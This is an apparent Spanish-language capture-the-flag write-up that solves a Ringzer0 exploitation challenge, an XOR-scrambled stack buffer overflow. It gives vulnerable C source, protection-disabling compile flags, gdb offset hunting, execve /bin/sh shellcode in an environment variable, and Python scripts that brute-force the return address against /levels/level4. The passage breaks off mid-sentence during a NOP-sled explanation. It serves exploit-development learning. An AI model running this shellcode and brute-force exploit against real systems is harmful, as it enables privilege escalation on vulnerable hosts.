
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Ringzer0 Level4 Pwned! By Hdbreaker - Security Signal</title>
  <meta name="author" content="q3rv0 - hdbreaker">

  
  <meta name="description" content="by hdbreakerHace algunos días me entere que el equipo de&nbsp;ringzer0team&nbsp;había creado nuevos retos de exploiting&nbsp;y decidí retomar el reto &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://securitysignal.github.io/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Security Signal</a></h1>
  
    <h2>Looking for signs of insecurity...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Ringzer0 Level4 Pwned! By Hdbreaker</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2016-01-07T01:21:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>1:21 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-VO1WNDA77xM/Vo3cxiLR73I/AAAAAAAAA0E/qdAG0KktkWE/s1600/descarga.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="276" src="http://3.bp.blogspot.com/-VO1WNDA77xM/Vo3cxiLR73I/AAAAAAAAA0E/qdAG0KktkWE/s400/descarga.png" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><b><br /></b></div><div style="text-align: left;">Hace algunos días me entere que el equipo de&nbsp;<a href="http://www.ringzer0team.com/">ringzer0team</a>&nbsp;había creado nuevos retos de exploiting&nbsp;y decidí retomar el reto que en su momento me dejo trabado.<br /><a name='more'></a><br />Este reto ya había sido solucionado por<b> [Q]3rv[0]</b>&nbsp;y en su momento compartió su solución en:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><a href="http://www.securitysignal.org/2015/02/level4-pwned.html">http://www.securitysignal.org/2015/02/level4-pwned.html</a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Este post no trata de ser una repetición de lo mismo, sino un enfoque distinto para resolver el reto.<br /><br />De mas esta decir que voy a ir tratando los distintos problemas que fui encontrando ya que no he había propuesto no leer la solución de&nbsp;<b>[Q]3rv[0] </b>hasta haberlo resuelto por mis propios medios.<br /><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-FMROPDIhx8I/Vo3fkVW8MII/AAAAAAAAA0Q/T1HUTMrFbsw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A45%253A34.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="278" src="http://4.bp.blogspot.com/-FMROPDIhx8I/Vo3fkVW8MII/AAAAAAAAA0Q/T1HUTMrFbsw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A45%253A34.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Para poder ingresar al reto previamente hay que resolver el <b>level 3</b>, en ningún post voy a dejar los flags ya que estas entradas buscan ayudar a los participantes que se han quedado trabados o quieren aprender y mejorar sus habilidades en el desarrollo de Exploits.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><div style="text-align: center;"><span style="color: red;"><b>Solo escribiré entradas respecto a los retos que me han resultado difíciles de resolver y creo interesante compartir debido a su dificultad de resolución.</b></span></div><br />Una vez ingresamos por ssh al servidor debemos dirigirnos hacia la carpeta <b>/levels/ </b>en ella nos encontramos con los binarios a explotar y su respectivo código fuente:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-VG-vWel4r5U/Vo3g3upIZFI/AAAAAAAAA0Y/U9YyA5e6dyI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A51%253A42.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="196" src="http://2.bp.blogspot.com/-VG-vWel4r5U/Vo3g3upIZFI/AAAAAAAAA0Y/U9YyA5e6dyI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A51%253A42.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Antes de leer el código realizamos una primera ejecución del binario enviando como argumento el texto <b>TEST</b>:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-k506pdng1M8/Vo3iBZ3DWKI/AAAAAAAAA0g/dkgHyzf0iuA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A56%253A37.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="45" src="http://1.bp.blogspot.com/-k506pdng1M8/Vo3iBZ3DWKI/AAAAAAAAA0g/dkgHyzf0iuA/s400/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A56%253A37.png" width="400" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Podemos observar que la salida no se parece en nada a nuestro parámetro por lo que revisaremos un poco el código fuente para ver que hace el binario:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-OjFoux7BToY/Vo3jVpu3u1I/AAAAAAAAA0o/GReWbBcWOPk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A02%253A11.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://1.bp.blogspot.com/-OjFoux7BToY/Vo3jVpu3u1I/AAAAAAAAA0o/GReWbBcWOPk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A02%253A11.png" width="443" /></a></div><div style="text-align: center;"><br /></div></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Al leerlo podemos observar que nuestro parámetro es tratado por la función <b>parse_buffer() </b>antes de ser mostrado en pantalla.<br /><br /><b>parse_buffer</b>:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-WMjTl3LHA-8/Vo3kM37ERQI/AAAAAAAAA0w/bPHT-ygQ_Uo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A05%253A43.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="148" src="http://4.bp.blogspot.com/-WMjTl3LHA-8/Vo3kM37ERQI/AAAAAAAAA0w/bPHT-ygQ_Uo/s400/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A05%253A43.png" width="400" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Esta función genera un <b>key </b>aleatorio <b>(unsigned char) </b>que va desde 0 a 255, luego recorre cada carácter del buffer y le realiza la operación XOR con el <b>key </b>generado.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">para más información ver:<br /><a href="http://stackoverflow.com/questions/75191/what-is-an-unsigned-char">http://stackoverflow.com/questions/75191/what-is-an-unsigned-char</a>.</div><div><a href="http://www.taringa.net/posts/hazlo-tu-mismo/15576788/Implementar-XOR-a-la-hora-cifrar.html">http://www.taringa.net/posts/hazlo-tu-mismo/15576788/Implementar-XOR-a-la-hora-cifrar.html</a><br /><br />Este proceso es conocido como un algoritmo de cifrado simétrico, lo que quiere decir que si repetimos el mismo procedimiento sobre el buffer cifrado, este volverá a su estado original (se descifraría).<br /><br />Bajo este concepto. si&nbsp;conociésemos el valor del key, podríamos manejar la información almacenada en el buffer.<br /><br />Al tratarse de un cifrado simétrico, si nosotros previamente cifráramos con el mismo key nuestro argumento, la función <b>parse_buffer </b>realmente trabajaría descifrando el buffer.<br /><br />Para poder realizar este proceso sin tener que lidiar con la función <b>rand() </b>del binario, forzaremos el key a un numero especifico y compilaremos un binario de testing.</div><div><br /></div><div style="text-align: left;"><br /></div><pre class="brush: cpp">#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br />        char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(21); /* rand() fue modificado por el numero 21 */<br />   &nbsp;printf("KEY %d\n", key); /* muestro el key para asegurarme que sea correcto */<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /></pre><br />con este simple cambio nos garantizamos que nuestro binario de testing cifre/descifre siempre con el key 21.<br /><br />Compilamos con los flags correspondientes para eliminar cualquier tipo de protección y damos los permisos necesarios.<br /><br /><b>$ gcc -m32 -fno-stack-protector -z execstack -o /tmp/level4test /tmp/level4.c</b><br /><b>chmod 777 /tmp/level4test</b><br /><br />Solo resta crear un pequeño script en python que tome un argumente le realice un cifrado XOR 21 e imprima la cadena:<br /><br /><pre class="brush: py">#/tmp/payload.py<br />#Cifrado XOR en python<br />import sys<br />if(len(sys.argv)&lt;2):<br />        print "Usage: python payload.py {string}";<br />else:<br />        payload = "";<br />        key = 21;<br />        for letter in sys.argv[1]:<br />                payload = payload + str(chr(ord(letter) ^ int(key)));<br />        print payload;<br /><br /><br /></pre>En este punto si realizamos la ejecución del binario de la siguiente forma:<br /><br /><b>/tmp/level4test $(python /tmp/payload.py TEST)</b><br /><br />Apreciamos como el output del binario realizo el descifrado del argumento "TEST" cifrado previamente por nuestro payload.py.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-O9ZSAN3Bs5A/Vo3tzTJOXmI/AAAAAAAAA1A/gl45gpb7OiE/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A46%253A52.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="89" src="http://1.bp.blogspot.com/-O9ZSAN3Bs5A/Vo3tzTJOXmI/AAAAAAAAA1A/gl45gpb7OiE/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A46%253A52.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Ahora podemos proceder a intentar overflodear el ejecutable sin miedo a pisar EIP con una dirección de memoria cifrada y sin sentido para el procesador.<br /><div><br /></div><div>Leyendo el código fuente del binario podemos obtener que el largo mínimo necesario para overflodear el buffer es 256 bytes, esto lo interpretamos siendo que:<br /><br /></div><div><pre class="brush: cpp">#define BUFFER_MAX_SIZE 1024 // El tamaño máximo del buffer es 1024 bytes&nbsp;<br /> char in[BUFFER_MAX_SIZE]; //Se crea el array in con un tamaño de 1024 bytes<br /> memset(out, 0, BUFFER_MAX_SIZE / 4) //Se le asigna un espacio de 256 bytes a la variable out<br /> strncpy(in, argv[1], BUFFER_MAX_SIZE - 1); //Se copian 1023 bytes del argumento binario al array in<br /> strncpy(out, in, BUFFER_MAX_SIZE - 1); //Se copian 1023 bytes de in en out, acá se produce en buffer overflow ya que out espera un maximo de 256 bytes y recibe 1023 bytes<br /></pre><br /><div style="-webkit-text-stroke-width: 0px; color: black; font-family: 'Times New Roman'; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; margin: 0px; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px;">Procederemos a depurar con gdb el binario y enviamos como argumento de payload.py: <b>$(python -c "print 'A'*256")</b></div><br /><div><b>r $(python /tmp/payload.py $(python -c "print 'A'*256"))</b></div><div><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-oUIFHAJVUkc/Vo3xATi3LjI/AAAAAAAAA1M/G65P_3taf4M/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A00%253A32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="188" src="http://3.bp.blogspot.com/-oUIFHAJVUkc/Vo3xATi3LjI/AAAAAAAAA1M/G65P_3taf4M/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A00%253A32.png" width="640" /></a></div><div><br /></div><div class="separator" style="clear: both; text-align: center;"></div><div>Vemos como hemos logrado pisar de forma correcta EIP, pero esta vez la sobrescritura de EIP no se produce al final del binario como podemos apreciar modificando los últimos 4 bytes:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-j4VftW7tpeQ/Vo302Uap-dI/AAAAAAAAA1Y/3HN-GffwPHk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A16%253A54.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="156" src="http://4.bp.blogspot.com/-j4VftW7tpeQ/Vo302Uap-dI/AAAAAAAAA1Y/3HN-GffwPHk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A16%253A54.png" width="640" /></a></div><div style="text-align: center;"><br /></div>por lo que deberemos buscar exactamente donde sobrescribimos EIP, para esto dividimos 256 bytes en 3 tipos distintos de caracteres para acorralar el byte justo:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-_ao-A30tyBA/Vo31fUsM9iI/AAAAAAAAA1g/I8J0J-iaV84/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A19%253A36.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="150" src="http://1.bp.blogspot.com/-_ao-A30tyBA/Vo31fUsM9iI/AAAAAAAAA1g/I8J0J-iaV84/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A19%253A36.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Podemos ver que se logra sobrescribir EIP en los primeros 84 bytes, por lo que repetimos el proceso las veces que sea necesario hasta obtener que EIP se sobrescribe luego de 12 bytes:</div><div><br /></div><div><b>r $(python /tmp/payload.py $(python -c "print 'A'*12+'B'*4+'C'*240"))</b></div><div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-qsLYae4syHs/Vo3176uXdSI/AAAAAAAAA1s/j_sNWtRhL7w/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A21%253A32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="170" src="http://3.bp.blogspot.com/-qsLYae4syHs/Vo3176uXdSI/AAAAAAAAA1s/j_sNWtRhL7w/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A21%253A32.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br />En este momento podemos controlar el flujo del programa de forma exitosa, obligando al programa a saltar hacia donde nosotros queramos.<br /><h2 style="text-align: center;"><b>El dilema: donde agrego el shellcode?</b></h2><br />Se pueden tomar 2 caminos muy distintos en este punto, podemos optar por incluir nuestro shellcode en el espacio de 240 bytes al final del buffer, o podemos incluir nuestra shellcode dentro de una variable de entorno.<br /><br />A simple vista ambas soluciones parecen optimas salvo un detalle, a veces al realizar cifrados/descifrados sobre algunos bytes como <b>\x01, \x02, \x03, etc</b> obtenemos badchars que rompen nuestro flujo de ejecución.<br /><br />Por lo que luego de varios intentos frustrados con este método me decidí a incluir el shellcode por medio de una variable de entorno y de esta forma mantenerla lejos de cualquier operación XOR en el proceso de explotación.<br /><br />Exportamos nuestra shellcode:<br /><br /><b>$ export SecuritySignal=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")</b><br /><b><br /></b>Volvemos a gdb y comenzamos a buscar la dirección de la variable de entorno al final de $esp<br /><br /><b>(gdb) b main</b><br /><b>(gdb) r</b><br /><b>(gdb) x/10s $esp</b><br /><br />Damos enter hasta llegar a la dirección:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-zPtPt86Q_g8/Vo4j34jn7PI/AAAAAAAAA3g/ctynzRB-W6M/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A37%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-zPtPt86Q_g8/Vo4j34jn7PI/AAAAAAAAA3g/ctynzRB-W6M/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A37%253A28.png" /></a></div><br /></div><b><br /></b>podemos apreciar que la dirección de <b>SecuritySignal&nbsp;</b>es: <b>0xbfffff33</b><br /><b><br /></b><b>No debemos olvidar que en realidad la variable de entorno es un string por lo tanto nuestro shellcode comienza en&nbsp;0xbfffff33+(len('SecuritySignal=')) que es igual a&nbsp;0xbfffff42</b><br /><b><br /></b>Si realizamos una prueba rápida de esto, podemos ver como obtenemos shell:<br /><br /><b>r $(python /tmp/payload.py $(python -c "import struct; print 'A'*12+struct.pack('&lt;I',&nbsp;0xbfffff42)+'C'*240"))</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-85-z58jtcS0/Vo4kbrxWePI/AAAAAAAAA3o/PZw3H4S4VfU/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A39%253A55.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="130" src="http://4.bp.blogspot.com/-85-z58jtcS0/Vo4kbrxWePI/AAAAAAAAA3o/PZw3H4S4VfU/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A39%253A55.png" width="640" /></a></div><br /></div>Este proceso funciona de la misma forma para el binario original en <b>/levels/level4 </b>solo que ademas deberemos luchar con el cifrado XOR RANDOM, y no hay que olvidar que al producir shell dentro de gdb no escalaremos privilegios por lo que hay que buscar la forma de obtener shell por medio de bash.<br /><br /><h2 style="text-align: center;">EL GRAN PROBLEMA</h2><br />La memoria funciona de una forma bastante compleja, intentare detallar algunos problemas:<br /><br />Una variable de entorno dentro de gdb tiene una determinada dirección, pero por fuera de gdb, directamente desde bash, esta dirección de memoria cambia dependiendo de diferentes factores, puede incrementar o disminuir una cantidad aleatoria de bytes, por lo general entre 100 y 500 bytes.<br /><br />Ya que esto sucede nuestra dirección de memoria:&nbsp;<b>0xbfffff42</b><b>&nbsp;</b>no nos sirve para realizar una explotación por fuera de gdb.<br /><br /><b>Como obtenemos la dirección de memoria de una variable de entorno?</b><br /><b><br /></b>Para realizar esto utilizaremos un pequeño programa en C y haremos uso de la función <b>getenv() </b>que permite desde el código obtener una variable de entorno:<br /><br /></div></div><pre class="brush: cpp">#/tmp/getenv.c<br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />int main(int argc, char *argv[]) {<br /><br />if(argc &lt; 2) {<br />printf("Usage: %s &lt;environ_va&gt;\n", argv[0]);<br />exit(-1);<br />}<br /><br />char *addr_ptr;<br /><br />addr_ptr = getenv(argv[1]);<br /><br />if(addr_ptr == NULL) {<br />printf("Environmental variable %s does not exist!\n", argv[1]);<br />exit(-1);<br />}<br /><br />printf("%s is stored at address %p\n", argv[1], addr_ptr);<br />return(0);<br />}<br /><br /></pre>Compilamos el programa: <b>gcc -o /tmp/getenv /tmp/getenv.c</b><br />Ejecutamos enviando como parametro el nombre de nuestra variable de entorno:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-hVZB6iX4V5A/Vo4k86rp-YI/AAAAAAAAA3w/Ui7rTHeRo9Q/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A42%253A11.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="53" src="http://1.bp.blogspot.com/-hVZB6iX4V5A/Vo4k86rp-YI/AAAAAAAAA3w/Ui7rTHeRo9Q/s400/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A42%253A11.png" width="400" /></a></div><br /></div><div style="text-align: left;">Esto nos indica que nuestra SHELLCODE esta <b>cerca </b>de <b>0xbfffff38</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Tristemente como suena, no hay forma de obtener la dirección exacta del comienzo de una variable de entorno, simplemente basta con retroceder una cierta cantidad de bytes de donde especulamos se encuentra nuestra variable de entorno e ir avanzando byte por byte.<br /><br />Al ser este proceso bastante tedioso decidí realizar un script que realice el trabajo bruteforceando la dirección de memoria por mi:</div><div style="text-align: left;"><br /></div><pre class="brush: py">#/tmp/wrapper.py<br />#Bruteforce SHELLCODE address by hdbreaker<br />import os<br />import struct<br /><br />def xor_enc(inside):<br /> payload = "";<br /> key = 21;<br /> for letter in inside:<br />  payload = payload + str(chr(ord(letter) ^ int(key)));<br /> return payload;<br /><br />address = 0xbffff838; #Back in memory address, original =&gt; 0xbfffff38  <br />sleed1 = 'TEST'+'\x90'*8<br />sleed2 = '\x90'*240<br /><br />while True:<br /> try:<br />  hex_add = struct.pack('&lt;I',address)<br /><br />  payload = sleed1+hex_add+sleed2<br />  arg = xor_enc(payload)<br /><br />  print str(hex(ord(hex_add[3]))) + str(hex(ord(hex_add[2]))).replace('0x','') + str(hex(ord(hex_add[1]))).replace('0x','') + str(hex(ord(hex_add[0]))).replace('0x','');<br /><br />  os.system('/tmp/level4test '+arg)<br />  address = address+0x01<br /> except:<br />  address = address+0x01<br /><br /></pre>Luego de probar varias direcciones, nuestra shell aparece y podemos ver como el script nos muestra la dirección de memoria donde encuentra la variable de entorno SecuritySignal:  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-nTtERpfuyD8/Vo4mF8GNPpI/AAAAAAAAA34/R7ekPBJs5O0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A46%253A51.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="358" src="http://2.bp.blogspot.com/-nTtERpfuyD8/Vo4mF8GNPpI/AAAAAAAAA34/R7ekPBJs5O0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A46%253A51.png" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Podemos apreciar como el exploit va bruteforceando la dirección de memoria hasta obtener shell en:&nbsp;<b>0xbffff9a9</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">De esta forma obtenemos la dirección de memoria correcta de nuestra variable SecuritySignal, la lógica indica que utilizando esta dirección de memoria en el binario original y lidiando un rato con el cifrado XOR RANDOM, deberíamos obtener SHELL con privilegios.<br /><br />Realizaremos una prueba rápida modificando el valor de memoria del exploit a:&nbsp;<b>0xbffff9a9</b>, eliminando el incremento de la dirección de memoria,&nbsp;cambiando la ruta del ejecutable a: <b>/levels/level4 </b>y para tener un mejor control visual de la ejecución del programa agregaremos un pequeño retraso entre cada ejecución:</div><div style="text-align: left;"><div style="text-align: center;"><br /></div></div><div style="text-align: left;"><b><span style="color: red;">Nota: se agrego el string 'TEST' al comienzo de los primeros 12 bytes con el fin de poder tener una referencia visual cuando rand() tome el valor 21 (TEST se volvería legible en pantalla)</span></b></div><div style="text-align: left;"><br /></div><pre class="brush: py">import os<br />import time<br />import struct<br /><br />def xor_enc(inside):<br /> payload = "";<br /> key = 21;<br /> for letter in inside:<br />  payload = payload + str(chr(ord(letter) ^ int(key)));<br /> return payload;<br /><br />address = 0xbffff9a9; #Address of SHELLCODE enviroment variable  <br />sleed1 = 'TEST'+'\x90'*8<br />sleed2 = '\x90'*240<br /><br />while True:<br /> try:<br />  hex_add = struct.pack('&lt;I',address)<br /><br />  payload = sleed1+hex_add+sleed2<br />  arg = xor_enc(payload)<br /><br />  print str(hex(ord(hex_add[3]))) + str(hex(ord(hex_add[2]))).replace('0x','') + str(hex(ord(hex_add[1]))).replace('0x','') + str(hex(ord(hex_add[0]))).replace('0x','');<br /><br />  os.system('/levels/level4 '+arg) #Change executable file to /levels/level4<br />  time.sleep(0.75)<br /> except:<br />  pass<br /><br /></pre>Luego de un tiempo la función <b>rand() </b>toma el valor 21 y descifra correctamente nuestro payload:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-TvKKLIwX1IU/Vo4mrqev36I/AAAAAAAAA4A/ZsE7yIv4dcA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A49%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="52" src="http://2.bp.blogspot.com/-TvKKLIwX1IU/Vo4mrqev36I/AAAAAAAAA4A/ZsE7yIv4dcA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A49%253A28.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><b>PERO QUE?!? </b>en este punto quede desconcertado un par de días y me puse a estudiar más sobre la gestión de memoria y la localización de las variables de entorno.<br /><br />En ese tiempo aprendí que las variables de entorno no solo cambian de dirección por fuera de gdb sino que también cambian de dirección dependiendo el path donde estemos situados, así que <b>SecuritySignal</b> se encontrará en<b> 0xbffff9a9</b> solo para los binarios que se encuentren en la carpeta <b>/tmp/ </b>pero no para los binarios en la carpeta <b>/levels/.</b></div><div style="text-align: left;"><br />Debido a esto me encontraba bastante frustrado, el proceso de bruteforcing debería funcionar pero... al tener que lidiar con el cifrado XOR RANDOM los bucles se volverían practicamente infinitos, ya que debería repetir la misma dirección de memoria hasta garantizar que el payload se descifro correctamente y si el payload no me brinda una shell,&nbsp;recién ahí volver a incrementar la dirección de memoria.<br /><br />El trabajo tardaría meses o quizás años, &nbsp;así que me estanque en este punto y decidí tomarme un día más para pensar en posibles soluciones.<br /><br />Pasado el día lejos del reto decidí retomar con la mente fresca, y al poco tiempo de intentar superar el reto se me ocurrió lo siguiente:<br /><br />Si, <b>getenv </b>me da una dirección de memoria, no exacta, pero próxima a - 250 o + 250 bytes podría rellenar ese espacio con <b>NOPS (nopsleed)&nbsp;</b>esperando que la dirección que me devuelve <b>getenv </b>se escriba con <b>NOP</b>, de esta forma el flujo de ejecución continuaria hasta llegar al shellcode alojado al final de la variable de entorno.<br /><br />Mejor explicado:<br /><br /><b>$/tmp/getenv</b>&nbsp;<b>SecuritySignal</b>&nbsp; me comunica que la variable de entorno se encuentra próxima a: <b>0xbffffd42</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Esto quiere decir que el punto de inició de mi shellcode podría encontrarse entre&nbsp;<b>0xbffffc48</b>&nbsp;y&nbsp;<b>0xbffffe3c (+- 250 bytes desde&nbsp;</b><b>0xbffffd44</b><b>)</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Si yo pudiera llenar ese espacio de posibilidades con <b>NOPS (\x90)</b>, al forzar el salto hacia:&nbsp;<b>0xbffffd42</b><b>&nbsp;</b>este y las posteriores posibilidades tendrían el valor <b>NOP </b>por lo que el 